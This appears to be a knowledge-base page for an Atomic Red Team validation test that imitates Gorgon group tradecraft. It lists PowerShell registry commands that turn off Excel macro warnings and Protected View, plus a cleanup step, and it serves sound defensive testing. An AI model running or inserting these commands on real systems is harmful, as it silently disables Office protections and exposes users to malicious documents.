---
atomic_guid: "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7"
title: "Disable Microsoft Office Security Features"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7"
  - "Disable Microsoft Office Security Features"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Disable Microsoft Office Security Features

Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
show any warning before editing the document.


https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/

## Metadata

- Atomic GUID: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- name: powershell

### Command

```powershell
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
```

### Cleanup

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -ErrorAction Ignore | Out-Null
Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
